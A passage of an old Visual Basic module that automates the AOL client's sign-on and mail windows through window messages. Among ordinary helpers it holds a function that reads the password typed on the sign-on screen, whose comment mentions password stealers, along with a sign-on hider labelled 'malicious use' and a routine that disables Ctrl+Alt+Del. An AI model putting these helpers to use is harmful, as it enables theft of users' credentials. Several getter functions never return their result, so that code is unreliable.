    AOLIcon2& = FindWindowEx(AOLChild&, AOLIcon&, "_AOL_Icon", vbNullString)
    For i& = 1& To 2&
        AOLIcon2& = FindWindowEx(AOLChild&, AOLIcon2&, "_AOL_Icon", vbNullString)
    Next i&
    AOLImage& = FindWindowEx(AOLChild&, 0&, "_AOL_Image", vbNullString)
    AOLStatic3& = FindWindowEx(AOLChild&, AOLStatic2&, "_AOL_Static", vbNullString)
    AOLStatic3& = FindWindowEx(AOLChild&, AOLStatic3&, "_AOL_Static", vbNullString)
    aollistbox& = FindWindowEx(AOLChild&, 0&, "_AOL_Listbox", vbNullString)
    AOLStatic4& = FindWindowEx(AOLChild&, AOLStatic3&, "_AOL_Static", vbNullString)
    AOLIcon3& = FindWindowEx(AOLChild&, AOLIcon2&, "_AOL_Icon", vbNullString)
    For i& = 1& To 7&
        AOLIcon3& = FindWindowEx(AOLChild&, AOLIcon3&, "_AOL_Icon", vbNullString)
    Next i&
    AOLStatic5& = FindWindowEx(AOLChild&, AOLStatic4&, "_AOL_Static", vbNullString)
    If AOLStatic& And richcntl& And AOLCombobox& And AOLIcon& And AOLStatic2& And RICHCNTL2& And AOLIcon2& And AOLImage& And AOLStatic3& And aollistbox& And AOLStatic4& And AOLIcon3& And AOLStatic5& Then Exit Do
    counter& = Val(counter&) + 1&
Loop
If Val(counter&) < 100& Then
    FindChatRoom& = AOLChild&
    Exit Function
End If
End Function

Public Sub FormCenter(FormName As Form)
With FormName
.Left = (Screen.Width - .Width) / 2
.Top = (Screen.Height - .Height) / 2
End With
End Sub

Public Sub FormDrag(FormName As Form)
'make sure that the sub in your form you have this in,
'is like BLAH_MouseDown, mouse down is when you call
'this like
' Private Sub Blah_MouseDown(blah blah blah)
' Call FormDrag(me) or (form1)
' End Sub
Call ReleaseCapture
Call SendMessage(FormName.hwnd, WM_SYSCOMMAND, WM_MOVE, 0)
End Sub

Public Sub ListClear(ListBox As ListBox)
'Clears a list box
'call ListClear(list1)
ListBox.Clear
End Sub
Public Sub ListKillDupes(ListBox As ListBox)
'Kills dublicite items in a listbox
        Dim Search1 As Long
        Dim Search2 As Long
        Dim KillDupe As Long
KillDupe = 0
For Search1& = 0 To ListBox.ListCount - 1
For Search2& = Search1& + 1 To ListBox.ListCount - 1
KillDupe = KillDupe + 1
If ListBox.List(Search1&) = ListBox.List(Search2&) Then
ListBox.RemoveItem Search2&
Search2& = Search2& - 1
End If
Next Search2&
Next Search1&
End Sub

Public Function ListToTextString(ListBox As ListBox, InsertSeparator As String) As String
'Makes list a txt string
        Dim CurrentCount As Long, PrepString As String
For CurrentCount& = 0 To ListBox.ListCount - 1
PrepString$ = PrepString$ & ListBox.List(CurrentCount&) & InsertSeparator$
Next CurrentCount&
ListToTextString$ = Left(PrepString$, Len(PrepString$) - 2)
End Function
Public Sub ListCopy(SourceList As Long, DestinationList As Long)
'Copys a list to another
'Call ListCopy ("list1", "List2")
        Dim SourceCount As Long, OfCountForIndex As Long, FixedString As String
SourceCount& = SendMessageLong(SourceList&, LB_GETCOUNT, 0&, 0&)
Call SendMessageLong(DestinationList&, LB_RESETCONTENT, 0&, 0&)
If SourceCount& = 0& Then Exit Sub
For OfCountForIndex& = 0 To SourceCount& - 1
FixedString$ = String(250, 0)
Call SendMessageByString(SourceList&, LB_GETTEXT, OfCountForIndex&, FixedString$)
Call SendMessageByString(DestinationList&, LB_ADDSTRING, 0&, FixedString$)
Next OfCountForIndex&
End Sub

Public Function ListGetText(ListBox As Long, index As Long) As String
        Dim ListText As String * 256
Call SendMessageByString(ListBox&, LB_GETTEXT, index&, ListText$)
ListGetText$ = ListText$
End Function

Public Sub ListRemoveSelected(ListBox As ListBox)
        Dim ListCount As Long
ListCount& = ListBox.ListCount
Do While ListCount& > 0&
ListCount& = ListCount& - 1
If ListBox.Selected(ListCount&) = True Then
ListBox.RemoveItem (ListCount&)
End If
Loop
End Sub
Public Sub Load2listboxes(Path As String, List1 As ListBox, List2 As ListBox)
'Loads Two list boxes
        Dim MyString As String, String1 As String, String2 As String
On Error Resume Next
Open Path$ For Input As #1
While Not EOF(1)
Input #1, MyString$
String1$ = Left(MyString$, InStr(MyString$, "*") - 1)
String2$ = Right(MyString$, Len(MyString$) - InStr(MyString$, "*"))
DoEvents
List1.AddItem String1$
List2.AddItem String2$
Wend
Close #1
End Sub

Public Sub Loadlistbox(Path As String, List1 As ListBox)
'Loads list box
'Call LoadListBox(app.path, list1)
        Dim s60 As String
On Error Resume Next
Open Path$ For Input As #1
While Not EOF(1)
Input #1, s60$
DoEvents
List1.AddItem s60$
Wend
Close #1
End Sub

Public Sub UnloadAllForms()
    Dim OfTheseForms As Form
For Each OfTheseForms In Forms
Unload OfTheseForms
Set OfTheseForms = Nothing
Next OfTheseForms
End Sub

Sub DisableACD()
' this command disables Alt+Ctrl+Del
Call SystemParametersInfo(97, True, 0&, 0)
End Sub


Sub EnableACD()
' this command enables Alt+Ctrl+Del
Call SystemParametersInfo(97, False, 0&, 0)
End Sub

Public Sub FormExitDown(FormName As Form)
    Do
        DoEvents
        FormName.Top = Trim(Str(Int(FormName.Top) + 300))
    Loop Until FormName.Top > 7200
End Sub

Public Sub FormExitLeft(FormName As Form)
    Do
        DoEvents
        FormName.Left = Trim(Str(Int(FormName.Left) - 300))
    Loop Until FormName.Left < -FormName.Width
End Sub

Public Sub FormExitRight(FormName As Form)
    Do
        DoEvents
        FormName.Left = Trim(Str(Int(FormName.Left) + 300))
    Loop Until FormName.Left > Screen.Width
End Sub

Public Sub FormExitUp(FormName As Form)
    Do
        DoEvents
        FormName.Top = Trim(Str(Int(FormName.Top) - 300))
    Loop Until FormName.Top < -FormName.Width
End Sub

Public Sub PlayMIDI(MIDIFile As String)
    Dim SafeFile As String
    SafeFile$ = dir(MIDIFile$)
    If SafeFile$ <> "" Then
        Call mciSendString("play " & MIDIFile$, 0&, 0, 0)
    End If
End Sub

Public Sub StopMIDI(MIDIFile As String)
    Dim SafeFile As String
    SafeFile$ = dir(MIDIFile$)
    If SafeFile$ <> "" Then
        Call mciSendString("stop " & MIDIFile$, 0&, 0, 0)
    End If
End Sub

Public Sub Playwav(WavFile As String)
    Dim SafeFile As String
    SafeFile$ = dir(WavFile$)
    If SafeFile$ <> "" Then
        Call sndPlaySound(WavFile$, SND_FLAG)
    End If
End Sub

Public Sub WriteToINI(Section As String, Key As String, KeyValue As String, Directory As String)
Call WritePrivateProfileString(Section$, UCase$(Key$), KeyValue$, Directory$)
End Sub

Public Function GetFromINI(Section As String, Key As String, Directory As String) As String
Dim strBuffer As String
strBuffer = String(750, Chr(0))
Key$ = LCase$(Key$)
GetFromINI$ = Left(strBuffer, GetPrivateProfileString(Section$, ByVal Key$, "", strBuffer, Len(strBuffer), Directory$))
End Function

Public Function ClickSignOn()
'on sign on screen
'dims
Dim i As Long
Dim AOLIcon As Long
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
'finds frame
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Sign On")
AOLIcon& = FindWindowEx(AOLChild&, 0&, "_AOL_Icon", vbNullString)
'finds icon
For i& = 1& To 3&
    AOLIcon& = FindWindowEx(AOLChild&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
'clicks
Call SendMessage(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(AOLIcon&, WM_LBUTTONUP, 0&, 0&)
End Function

Public Function ClickHelpOnSignOnScreen()
'on sign on screen
Dim i As Long
Dim AOLIcon As Long
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Sign On")
AOLIcon& = FindWindowEx(AOLChild&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 2&
    AOLIcon& = FindWindowEx(AOLChild&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessage(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(AOLIcon&, WM_LBUTTONUP, 0&, 0&)
End Function

Public Function ClickAccessNumbers()
'on sign on screen
Dim AOLIcon As Long
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Sign On")
AOLIcon& = FindWindowEx(AOLChild&, 0&, "_AOL_Icon", vbNullString)
AOLIcon& = FindWindowEx(AOLChild&, AOLIcon&, "_AOL_Icon", vbNullString)
Call SendMessage(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(AOLIcon&, WM_LBUTTONUP, 0&, 0&)
End Function

Public Function ClickSetup()
'on sign on screen
Dim AOLIcon As Long
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Sign On")
AOLIcon& = FindWindowEx(AOLChild&, 0&, "_AOL_Icon", vbNullString)
Call SendMessage(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(AOLIcon&, WM_LBUTTONUP, 0&, 0&)
End Function

Public Function ClickAddNumber()
'sign on screen >> setup
Dim AOLIcon As Long
Dim AOLModal As Long
AOLModal& = FindWindow("_AOL_Modal", vbNullString)
AOLIcon& = FindWindowEx(AOLModal&, 0&, "_AOL_Icon", vbNullString)
Call SendMessage(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(AOLIcon&, WM_LBUTTONUP, 0&, 0&)
End Function

Public Function ClickEditNumber()
'sign on screen >> setup
Dim AOLIcon As Long
Dim AOLModal As Long
AOLModal& = FindWindow("_AOL_Modal", vbNullString)
AOLIcon& = FindWindowEx(AOLModal&, 0&, "_AOL_Icon", vbNullString)
AOLIcon& = FindWindowEx(AOLModal&, AOLIcon&, "_AOL_Icon", vbNullString)
Call SendMessage(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(AOLIcon&, WM_LBUTTONUP, 0&, 0&)
End Function

Public Function ClickAddLocation()
'sign on screen >> setup
Dim i As Long
Dim AOLIcon As Long
Dim AOLModal As Long
AOLModal& = FindWindow("_AOL_Modal", vbNullString)
AOLIcon& = FindWindowEx(AOLModal&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 2&
    AOLIcon& = FindWindowEx(AOLModal&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessage(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(AOLIcon&, WM_LBUTTONUP, 0&, 0&)
End Function

Public Function ClickAddModem()
'sign on screen >> setup
Dim i As Long
Dim AOLIcon As Long
Dim AOLModal As Long
AOLModal& = FindWindow("_AOL_Modal", vbNullString)
AOLIcon& = FindWindowEx(AOLModal&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 3&
    AOLIcon& = FindWindowEx(AOLModal&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessage(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(AOLIcon&, WM_LBUTTONUP, 0&, 0&)
End Function

Public Function ClickExpertSetup()
'sign on screen >> setup
Dim i As Long
Dim AOLIcon As Long
Dim AOLModal As Long
AOLModal& = FindWindow("_AOL_Modal", vbNullString)
AOLIcon& = FindWindowEx(AOLModal&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 4&
    AOLIcon& = FindWindowEx(AOLModal&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessage(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(AOLIcon&, WM_LBUTTONUP, 0&, 0&)
End Function

Public Function ClickCancel()
'sign on screen >> setup
Dim i As Long
Dim AOLIcon As Long
Dim AOLModal As Long
AOLModal& = FindWindow("_AOL_Modal", vbNullString)
AOLIcon& = FindWindowEx(AOLModal&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 5&
    AOLIcon& = FindWindowEx(AOLModal&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessage(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(AOLIcon&, WM_LBUTTONUP, 0&, 0&)
End Function

Public Function ClickHelp()
'sign on screen >> setup
Dim i As Long
Dim AOLIcon As Long
Dim AOLModal As Long
AOLModal& = FindWindow("_AOL_Modal", vbNullString)
AOLIcon& = FindWindowEx(AOLModal&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 6&
    AOLIcon& = FindWindowEx(AOLModal&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessage(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(AOLIcon&, WM_LBUTTONUP, 0&, 0&)
End Function

Public Function SetPW(text As String)
'on the sign on screen
'ex: Call SetPw("PwWouldGoHere")
Dim AOLEdit As Long
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Sign On")
AOLEdit& = FindWindowEx(AOLChild&, 0&, "_AOL_Edit", vbNullString)
Call SendMessageByString(AOLEdit&, WM_SETTEXT, 0&, text$)
End Function

Public Function HideSignOn()
'hides sign on screen...malicious use...
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Sign On")
Call ShowWindow(AOLChild&, SW_HIDE)
End Function

Public Function ShowSignOn()
'shows sign on screen after its hidden
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Sign On")
Call ShowWindow(AOLChild&, SW_SHOW)
End Function

Public Function MailSendTo(text As String)
'sends text to 'send to' person in write mail
Dim AOLEdit As Long
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Write Mail")
AOLEdit& = FindWindowEx(AOLChild&, 0&, "_AOL_Edit", vbNullString)
Call SendMessageByString(AOLEdit&, WM_SETTEXT, 0&, text$)
End Function

Public Function MailCopyTo(text As String)
'sends text to 'copy to' in write mail
Dim AOLEdit As Long
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Write Mail")
AOLEdit& = FindWindowEx(AOLChild&, 0&, "_AOL_Edit", vbNullString)
AOLEdit& = FindWindowEx(AOLChild&, AOLEdit&, "_AOL_Edit", vbNullString)
Call SendMessageByString(AOLEdit&, WM_SETTEXT, 0&, text$)
End Function

Public Function MailSubject(text As String)
'sends text to 'subject' when writing mail
Dim i As Long
Dim AOLEdit As Long
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Write Mail")
AOLEdit& = FindWindowEx(AOLChild&, 0&, "_AOL_Edit", vbNullString)
For i& = 1& To 2&
    AOLEdit& = FindWindowEx(AOLChild&, AOLEdit&, "_AOL_Edit", vbNullString)
Next i&
Call SendMessageByString(AOLEdit&, WM_SETTEXT, 0&, text$)
End Function

Public Function MailBody(text As String)
'sends text to 'body' of the write mail window
Dim richcntl As Long
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Write Mail")
richcntl& = FindWindowEx(AOLChild&, 0&, "RICHCNTL", vbNullString)
Call SendMessageByString(richcntl&, WM_SETTEXT, 0&, text$)
End Function

Public Function MailCheckReturnReciept()
'checks the return reciept check box on write mail
Dim AOLCheckbox As Long
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Write Mail")
AOLCheckbox& = FindWindowEx(AOLChild&, 0&, "_AOL_Checkbox", vbNullString)
Call SendMessage(AOLCheckbox&, BM_SETCHECK, True, 0&)
End Function

Public Function MailUnCheckReturnReciept()
'Unchecks the return reciept check box on write mail
Dim AOLCheckbox As Long
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Write Mail")
AOLCheckbox& = FindWindowEx(AOLChild&, 0&, "_AOL_Checkbox", vbNullString)
Call SendMessage(AOLCheckbox&, BM_SETCHECK, False, 0&)
End Function

Public Function MailChangeWriteMailCaption(text As String)
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim richcntl As Long
'Changes Write Mail's Caption to what ever you want
'Call MailChangeWriteMailCaption ("Source Ownz")
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Write Mail")
richcntl& = FindWindowEx(AOLChild&, 0&, "RICHCNTL", vbNullString)
Call SendMessageByString(AOLChild&, WM_SETTEXT, 0&, text$)
End Function

Public Function SignOnScreenCapChange(text As String)
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
'Changes Aols Sign On Screen Caption To Whatever You Want
'Call SignOnScreenCapChange("Source Sign ON")
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Sign On")
Call SendMessageByString(AOLChild&, WM_SETTEXT, 0&, text$)
End Function

Public Function ChangeAolCaption(text As String)
'Changes Aol's Caption
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
'Call ChangeAolCaption("Source Owned America Online 6.0")
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
Call SendMessageByString(AOLFrame&, WM_SETTEXT, 0&, text$)
End Function

Public Function MailGetSendTo()
'grabs text of the person mail is being sent to
'text1.text= (mailgetsendto)
Dim AOLEditTxt As String
Dim TextLen As Long
Dim AOLEdit As Long
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Write Mail")
AOLEdit& = FindWindowEx(AOLChild&, 0&, "_AOL_Edit", vbNullString)
TextLen& = SendMessage(AOLEdit&, WM_GETTEXTLENGTH, 0&, 0&)
AOLEditTxt$ = String(TextLen&, 0&)
Call SendMessageByString(AOLEdit&, WM_GETTEXT, TextLen& + 1&, AOLEditTxt$)
End Function

Public Function MailGetCopyTo()
'grabs text of the 'copy to' text when write mail is open
'text1.text= (mailgetcopyto)
Dim AOLEditTxt As String
Dim TextLen As Long
Dim AOLEdit As Long
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Write Mail")
AOLEdit& = FindWindowEx(AOLChild&, 0&, "_AOL_Edit", vbNullString)
AOLEdit& = FindWindowEx(AOLChild&, AOLEdit&, "_AOL_Edit", vbNullString)
TextLen& = SendMessage(AOLEdit&, WM_GETTEXTLENGTH, 0&, 0&)
AOLEditTxt$ = String(TextLen&, 0&)
Call SendMessageByString(AOLEdit&, WM_GETTEXT, TextLen& + 1&, AOLEditTxt$)
End Function

Public Function MailGetSubject(AOLEditTxt As String)
'Grabs Text of Subject in Write Mail
'text1.text= (mailgetsubject)
'dims
Dim AOLFrame As Long
Dim MDIClient As Long
Dim AOLChild As Long
Dim AOLEdit As Long
Dim i As Long
Dim TextLen As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Write Mail")
AOLEdit& = FindWindowEx(AOLChild&, 0&, "_AOL_Edit", vbNullString)

For i& = 1& To 2&
    AOLEdit& = FindWindowEx(AOLChild&, AOLEdit&, "_AOL_Edit", vbNullString)
Next i&
TextLen& = SendMessage(AOLEdit&, WM_GETTEXTLENGTH, 0&, 0&)
AOLEditTxt$ = String(TextLen&, 0&)
Call SendMessageByString(AOLEdit&, WM_GETTEXT, TextLen& + 1&, AOLEditTxt$)
End Function
Public Function FindChildByClass(ParentWindow As Long, ClassWindow As String) As Long
FindChildByClass& = FindWindowEx(ParentWindow&, 0&, ClassWindow$, vbNullString)
End Function
Public Function MailGetBody()
'Grabs body of Write Mail, the main text
'Text1.Text = (MailGetBody)
Dim RICHCNTLTxt As String
Dim TextLen As Long
Dim richcntl As Long
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", 0&)
MDIClient& = FindChildByClass(AOLFrame&, "MDIClient")
AOLChild& = FindChildByClass(MDIClient&, "AOL Child")
richcntl& = FindChildByClass(AOLChild&, "RICHCNTL")
TextLen& = SendMessage(richcntl&, WM_GETTEXTLENGTH, 0&, 0&)
RICHCNTLTxt$ = String(TextLen&, 0&)
Call SendMessageByString(richcntl&, WM_GETTEXT, TextLen& + 1&, RICHCNTLTxt$)
End Function

Public Function MailClickToolbarArrow()
Dim AOLIcon As Long
Dim aoltoolbar2 As Long
Dim AOLToolbar As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
AOLToolbar& = FindWindowEx(AOLFrame&, 0&, "AOL Toolbar", vbNullString)
aoltoolbar2& = FindWindowEx(AOLToolbar&, 0&, "_AOL_Toolbar", vbNullString)
AOLIcon& = FindWindowEx(aoltoolbar2&, 0&, "_AOL_Icon", vbNullString)
Call SendMessage(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(AOLIcon&, WM_LBUTTONUP, 0&, 0&)
End Function

Public Function GetPw()
'gets pw from sign on screen (needed for pws)
'Call GetPW
'or try
'Label1.caption=(GetPw)
'or try(heehe)
'label1.caption=GetPW
'something like that
Dim AOLEditTxt As String
Dim TextLen As Long
Dim AOLEdit As Long
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Sign On")
AOLEdit& = FindWindowEx(AOLChild&, 0&, "_AOL_Edit", vbNullString)
TextLen& = SendMessage(AOLEdit&, WM_GETTEXTLENGTH, 0&, 0&)
AOLEditTxt$ = String(TextLen&, 0&)
Call SendMessageByString(AOLEdit&, WM_GETTEXT, TextLen& + 1&, AOLEditTxt$)
End Function

Public Function ClickAolServicesArrow()
'Clicks the arrow to bring down drop menue for aol services
Dim i As Long
Dim AOLIcon As Long
Dim aoltoolbar2 As Long
Dim AOLToolbar As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
AOLToolbar& = FindWindowEx(AOLFrame&, 0&, "AOL Toolbar", vbNullString)
aoltoolbar2& = FindWindowEx(AOLToolbar&, 0&, "_AOL_Toolbar", vbNullString)
AOLIcon& = FindWindowEx(aoltoolbar2&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 6&
    AOLIcon& = FindWindowEx(aoltoolbar2&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessage(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(AOLIcon&, WM_LBUTTONUP, 0&, 0&)
End Function

Public Function ClickSettings()
'Clicks the Down Arrow for Settings on toolbar
Dim i As Long
Dim AOLIcon As Long
Dim aoltoolbar2 As Long
Dim AOLToolbar As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
AOLToolbar& = FindWindowEx(AOLFrame&, 0&, "AOL Toolbar", vbNullString)
aoltoolbar2& = FindWindowEx(AOLToolbar&, 0&, "_AOL_Toolbar", vbNullString)
AOLIcon& = FindWindowEx(aoltoolbar2&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 9&
    AOLIcon& = FindWindowEx(aoltoolbar2&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessage(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(AOLIcon&, WM_LBUTTONUP, 0&, 0&)
End Function

Public Function ClickFavorites()
'clicks the favorites icon from toolbar
Dim i As Long
Dim AOLIcon As Long
Dim aoltoolbar2 As Long
Dim AOLToolbar As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
AOLToolbar& = FindWindowEx(AOLFrame&, 0&, "AOL Toolbar", vbNullString)
aoltoolbar2& = FindWindowEx(AOLToolbar&, 0&, "_AOL_Toolbar", vbNullString)
AOLIcon& = FindWindowEx(aoltoolbar2&, 0&, "_AOL_Icon", vbNullString)
For i& = 1& To 11&
    AOLIcon& = FindWindowEx(aoltoolbar2&, AOLIcon&, "_AOL_Icon", vbNullString)
Next i&
Call SendMessage(AOLIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(AOLIcon&, WM_LBUTTONUP, 0&, 0&)

End Function

Public Function ChangeSelectScreenNameCaption(text As String)
'on the sign on screen , where it says select screen name
'this is the coding to change it to what you want.
'Call ChangeSelectScreenNameCaption("New Text Here")
Dim AOLStatic As Long
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Sign On")
AOLStatic& = FindWindowEx(AOLChild&, 0&, "_AOL_Static", vbNullString)
Call SendMessageByString(AOLStatic&, WM_SETTEXT, 0&, text$)
End Function

Public Function ChangeEnterPW(text As String)
'where it says Enter Password: on the sign on screen
'this is coding to change it to what you want.
'Call ChangeEnterPW("NEW TEXT IZ SOURCE OWNZ!")
Dim AOLStatic As Long
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Sign On")
AOLStatic& = FindWindowEx(AOLChild&, 0&, "_AOL_Static", vbNullString)
AOLStatic& = FindWindowEx(AOLChild&, AOLStatic&, "_AOL_Static", vbNullString)
Call SendMessageByString(AOLStatic&, WM_SETTEXT, 0&, text$)
End Function

Public Function ChangeSelectLocation(text As String)
'This changes where it says select location >>sign on screen
'Call ChangeSelectLocation("new TEXT!")
Dim i As Long
Dim AOLStatic As Long
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Sign On")
AOLStatic& = FindWindowEx(AOLChild&, 0&, "_AOL_Static", vbNullString)
For i& = 1& To 3&
    AOLStatic& = FindWindowEx(AOLChild&, AOLStatic&, "_AOL_Static", vbNullString)
Next i&
Call SendMessageByString(AOLStatic&, WM_SETTEXT, 0&, text$)
End Function

Public Function ChangeSendTo(text As String)
'On Write Mail, Where it says Send To:
'This is coding to change it
'Call ChangeSendTo("Victim:")
Dim AOLStatic As Long
Dim AOLChild As Long
Dim MDIClient As Long
Dim AOLFrame As Long
AOLFrame& = FindWindow("AOL Frame25", vbNullString)
MDIClient& = FindWindowEx(AOLFrame&, 0&, "MDIClient", vbNullString)
AOLChild& = FindWindowEx(MDIClient&, 0&, "AOL Child", "Write Mail")
